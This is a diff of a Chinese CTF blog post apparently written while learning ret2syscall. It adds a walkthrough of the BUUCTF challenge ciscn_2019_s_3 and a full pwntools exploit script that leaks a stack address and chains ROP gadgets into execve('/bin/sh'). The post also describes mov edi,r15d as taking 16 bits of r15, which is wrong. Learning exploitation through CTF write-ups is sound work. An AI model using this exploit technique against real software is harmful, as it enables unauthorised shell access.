@@ -442,21 +442,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:  
-                    2020-01-12
+                    2020-02-14
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="far fa-file-word fa-fw"></i>文章字数:  
-                        623
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="far fa-clock fa-fw"></i>阅读时长:  
-                        2 分
+                        4 分
                     </div>
                     
                 
@@ -472,40 +472,42 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>最近终于考完了难熬的期末考试 终于有时间整理下这半年学习的东西了 关于栈溢出系统调用的知识其实一直都是一知半解 仅限于能勉强用起来 具体的原理还是不是很了解 这里也是系统的学习一下这个栈溢出的利用手法 主要还是借鉴CTFWiki的知识进行的学习 </p>
+                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><p>最近终于考完了难熬的期末考试 终于有时间整理下这半年学习的东西了 关于栈溢出系统调用的知识其实一直都是一知半解 仅限于能勉强用起来 具体的原理还是不是很了解 这里也是系统的学习一下这个栈溢出的利用手法 主要还是借鉴CTFWiki的知识进行的学习 </p>
 <h2 id="系统调用的原理"><a href="#系统调用的原理" class="headerlink" title="系统调用的原理"></a>系统调用的原理</h2><p>其实栈溢出的系统调用没有那么高大上..起码我觉得没有栈迁移高大上….栈在乱飞..想想就觉得高级…栈溢出的西永调用主要是利用了一个系统层面的中断<code>int 0x80</code> 利用<code>int 0x80</code>来使程序陷入核心 然后将参数通过寄存器传往核心 具体调用的系统函数就是由系统调用号来决定 内核的中断处理机制会根据系统调用号 然后调用响应的内核函数 也就是系统调用 而栈溢出最终目的通常都是Getshell 那么观察一下所有的系统调用号 就会发现有一个我们的老面孔<code>execve</code> 其实之前执行的<code>system('/bin/sh)</code>的真实形态执行的就是 <code>execve('/bin/sh')</code></p>
-<blockquote>
-<p>关于前20个32位系统的系统调用号如下 别问…问就是懒…</p>
-<p>#ifndef _ASM_X86_UNISTD_32_H</p>
-<p>#define _ASM_X86_UNISTD_32_H 1</p>
-<p>#define __NR_restart_syscall 0</p>
-<p>#define __NR_exit 1</p>
-<p>#define __NR_fork 2</p>
-<p>#define __NR_read 3</p>
-<p>#define __NR_write 4</p>
-<p>#define __NR_open 5</p>
-<p>#define __NR_close 6</p>
-<p>#define __NR_waitpid 7</p>
-<p>#define __NR_creat 8</p>
-<p>#define __NR_link 9</p>
-<p>#define __NR_unlink 10</p>
-<p>#define __NR_execve 11</p>
-<p>#define __NR_chdir 12</p>
-<p>#define __NR_time 13</p>
-<p>#define __NR_mknod 14</p>
-<p>#define __NR_chmod 15</p>
-<p>#define __NR_lchown 16</p>
-<p>#define __NR_break 17</p>
-<p>#define __NR_oldstat 18</p>
-<p>#define __NR_lseek 19</p>
-<p>#define __NR_getpid 20</p>
-</blockquote>
+<p>需要注意的是32位的<code>syscall</code>和64位<code>syscall</code>手法是不一样的 因为32位各个参数的传参方式是 EAX传递系统调用号 传参分别用EBX,ECX,EDX,ESI,EDI,EBP</p>
+<p>而64位的各个传参方式是 EAX传递系统调用号 传参分别用RDI,RSI,RDX,R10,R8,R9 而且32位的系统调用指令是<code>int 80h</code>而64位则是<code>syscall</code></p>
 <p>那么其实思路也很明确 既然整个程序没有地方能够泄漏libc 也没有system能Getshell 那么唯一的办法就是自己创造一个可以执行系统命令的环境出来 这时候我们需要了解到 <code>execve</code>函数的函数原型 即调用方法</p>
 <h3 id="execve函数的函数原型"><a href="#execve函数的函数原型" class="headerlink" title="execve函数的函数原型"></a>execve函数的函数原型</h3><p><code>execve('执行命令的地址',NULL,NULL)</code> </p>
-<h2 id="关于利用系统调用手法的实例"><a href="#关于利用系统调用手法的实例" class="headerlink" title="关于利用系统调用手法的实例"></a>关于利用系统调用手法的实例</h2><blockquote>
-<p>这里采用的实例和CTFWiki一样 使用bamboofox中的ret2syscall为例 </p>
-</blockquote>
-<p>首先 下载附件之后 老样子 先查保护 发现几乎保护都没开…</p>
+<p>在32位下 EAX=11 EBX=bin_addr EDX=0 ESI=0<br>在64位下 RAX=59 RDI=bin_addr ESI=0 RDX=0</p>
+<h2 id="关于利用系统调用手法的实例"><a href="#关于利用系统调用手法的实例" class="headerlink" title="关于利用系统调用手法的实例"></a>关于利用系统调用手法的实例</h2><p>这里使用的例题是BUUCTF上<code>ciscn_2019_s_3</code>的这道题 主函数就是两个<code>syscall</code>调用<br><a href="https://imgchr.com/i/1ja6b9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/14/1ja6b9.png" alt="1ja6b9.png"></a></p>
+<p>通过动态调试发现read了0x300个字符 肯定存在栈溢出 但是整个函数表中没有任何函数可以让我们操作一番 确定使用<code>syscall</code>来进行Getshell 那么我们需要的条件就是控制RAX,RDI,RSI,RDX 这时候选择使用通用gatget<code>libc_csu_init</code>来控制寄存器<br><a href="https://imgchr.com/i/1jdyz8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/14/1jdyz8.png" alt="1jdyz8.png"></a></p>
+<p>注意这里有个坑 本来想通过<code>libc_csu_init</code>来直接控制rdi的 但是这个<code>mov edi,r15d</code>并不是只吧r15的低16位拿上来 而是将rdi清空再将rdi的值设为r15的低16位 而我们的跳转主要是利用0x400589这个位置的call 反正我们可以控制栈上数据和r12的值 那call哪里都是我们说的算 </p>
+<p>那么基本思路就是 在栈上输入<code>/bin/sh</code>和填充字符 然后将程序劫持到通用gatget然后将需要的寄存器清零 最后控制r12跳向pop_rdi 然后再返回到<code>syscall</code>上即可 但是这样做需要泄漏出来一个栈上的地址 最后我们发现在输入+0x20的位置上有一个<code>bin_addr+0x118</code>的地址 那么通过下面的<code>write</code>就可以泄漏出来<code>bin_addr</code></p>
+<p>最终payload  </p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+pop_rax<span class="token operator">=</span><span class="token number">0x4004e2</span>
+pop6_addr<span class="token operator">=</span><span class="token number">0x40059A</span>
+read_addr<span class="token operator">=</span><span class="token number">0x4004ed</span>
+rdx_addr<span class="token operator">=</span><span class="token number">0x400580</span>
+sys<span class="token operator">=</span><span class="token number">0x400517</span>
+pop_rdi<span class="token operator">=</span><span class="token number">0x00000000004005a3</span>
+
+payload<span class="token operator">=</span><span class="token string">'/bin/sh'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
+bin_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x118</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bin_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+payload2<span class="token operator">=</span><span class="token string">'/bin/sh'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_addr<span class="token operator">+</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdx_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400501</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#payload2='/bin/sh'+'\x00'+'a'*8+p64(pop6_addr)+p64(0)+p64(0)+p64(bin_addr+0x68)+p64(0)+p64(0)+p64(bin_addr)+p64(pop_rdi)+p64(bin_addr)+p64(pop_rax)+p64(rdx_addr)+p64(0x400501)</span>
+<span class="token comment" spellcheck="true"># gdb.attach(sh)</span>
+<span class="token comment" spellcheck="true"># pause()</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -524,7 +526,7 @@
             });
             document.body.appendChild(img);
           });
-      </script>
+      </script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
             </div>
             <hr>
 
@@ -682,7 +684,7 @@
                 </a>
             </div>
             <br>
-            <a href="/2020/01/12/ji-yu-zhan-yi-chu-de-ret2syscall-xue-xi/">
+            <a href="/2020/02/14/ji-yu-zhan-yi-chu-de-ret2syscall-xue-xi/">
                     《基于栈溢出的ret2syscall学习》
             </a> 由
             <a href="http://Du4t.github.io">
@@ -726,44 +728,46 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i> 上一篇</div>
+                <i class="fas fa-chevron-left"></i> 本篇
+            </div>
             <div class="card">
-                <a href="/2020/01/14/zip-bao-po/">
+                <a href="/2020/02/14/ji-yu-zhan-yi-chu-de-ret2syscall-xue-xi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="ZIP爆破脚本">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="基于栈溢出的ret2syscall学习">
                         
-                        <span class="card-title">ZIP爆破脚本</span>
+                        <span class="card-title">基于栈溢出的ret2syscall学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Readme也是最近刚放假 打算写几个常用的小工具 一个是丰富自己的实战经验 另外一个也是为了划水摸鱼吧… 所以就先写了个爆破ZIP密码的小工具 整体代码效率应该还是较低的..毕竟我也只是线性的直接写下来..多线程的话现在也是刚接触..打算
+                            最近终于考完了难熬的期末考试 终于有时间整理下这半年学习的东西了 关于栈溢出系统调用的知识其实一直都是一知半解 仅限于能勉强用起来 具体的原理还是不是很了解 这里也是系统的学习一下这个栈溢出的利用手法 主要还是借鉴CTFWiki的知识进行的
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-01-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Others/" class="post-category">
-                                    Others
+                            <a href="/categories/PWN/" class="post-category">
+                                    PWN
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Others/">
-                        <span class="chip bg-color">Others</span>
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
                     </a>
                     
                 </div>
@@ -777,24 +781,26 @@
                 下一篇 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/12/15/uaf/">
+                <a href="/2020/01/23/how2heap-xue-xi-bi-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="UAF漏洞生成原理及利用">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="how2heap学习笔记">
                         
-                        <span class="card-title">UAF漏洞生成原理及利用</span>
+                        <span class="card-title">how2heap学习笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            UAF漏洞生成原因UAF漏洞全称为Use After Free 从字面意思上都能理解是在程序Free掉堆上的一个数据后还能继续使用 但是这并不单纯是一个函数上的漏洞 其实UAF漏洞生成的更多因素在于编程者书写代码时的逻辑漏洞 这里我们先抛除
+                            堆的基础知识堆是如何分配的在内存中堆有两种分配方式 一种是mmap另外一种是brk 这两者的区别是
+mmap:是当申请的堆块size>128kb时 使用mmap分配brk:是当申请的堆块size
+#include <string.h>
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-23
                             </span>
                         <span class="publish-author">
                             
@@ -937,7 +943,7 @@
             | Theme <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
             
-             <i class="fas fa-chart-area"></i> 站点总字数: <span class="white-color">27.3k</span> 字
+             <i class="fas fa-chart-area"></i> 站点总字数: <span class="white-color">29k</span> 字
             
             
             
